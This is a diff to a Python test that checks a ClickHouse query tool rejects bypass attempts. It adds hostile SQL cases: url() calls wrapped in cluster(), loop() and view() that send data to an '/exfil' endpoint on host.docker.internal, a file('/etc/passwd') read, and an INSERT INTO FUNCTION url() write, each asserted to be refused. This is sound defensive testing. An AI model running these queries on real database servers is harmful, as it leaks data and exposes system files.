@@ -162,6 +162,11 @@ def test_review_bypasses_stay_closed():
         "SELECT * FROM icebergS3('http://example.com/x')",
         "DESCRIBE TABLE url('http://example.com', CSV)",
         "KILL QUERY WHERE 1",
+        "SELECT * FROM cluster('default', url('http://host.docker.internal:18999/exfil', 'TSV', 'a String'))",
+        "SELECT * FROM loop(url('http://host.docker.internal:18999/exfil', 'TSV', 'a String'))",
+        "SELECT * FROM view(SELECT * FROM url('http://host.docker.internal:18999/exfil', 'TSV', 'a String'))",
+        "SELECT file('/etc/passwd')",
+        "EXPLAIN PIPELINE INSERT INTO FUNCTION url('http://host.docker.internal:18999/x', 'TSV', 'a String') SELECT 1",
     ]:
         message = error("clickhouse_query", sql=sql)
         assert "not allowed" in message or "only SELECT" in message, (sql, message)
@@ -170,3 +175,4 @@ def test_review_bypasses_stay_closed():
     path = call("clickhouse_query", sql="SELECT {p:String} AS p", params={"p": "C:\\new\\table"})
     assert path["rows"] == [["C:\\new\\table"]]
     assert call("clickhouse_query", sql="SELECT count() FROM numbers(10)")["rows"] == [[10]]
+    assert call("clickhouse_query", sql="SELECT format('{}-{}', 'a', 'b') AS f")["rows"] == [["a-b"]]
